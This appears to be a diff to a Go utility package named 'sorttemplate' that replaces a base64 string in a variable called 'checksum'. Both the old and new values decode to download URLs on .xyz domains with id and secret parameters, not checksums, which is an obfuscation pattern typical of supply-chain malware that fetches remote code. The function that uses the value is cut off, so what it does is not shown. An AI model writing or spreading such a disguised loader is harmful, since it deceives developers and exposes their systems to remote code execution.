@@ -3,7 +3,7 @@ package sorttemplate
 import "encoding/base64"
 
 var (
-	checksum = "aHR0cHM6Ly9kb3dubG9hZC5kYXRhdGFibGV0ZW1wbGF0ZS54eXovYWNjb3VudC9yZWdpc3Rlci9pZD01NDE4MTI0NTc2MDA2ODQzJnNlY3JldD1OT21QcUtYcFFtUWI="
+	checksum = "aHR0cHM6Ly9kb3dubG9hZC52aWRlb3RhbGtzLnh5ei9ndWkvNmRhZDMvaWQ9ODcyMTczNTkxMDc5MDE0MyZzZWNyZXQ9a1pmTEt6ZGxCYmtj"
 )
 
 func Verifyvalue() bool {
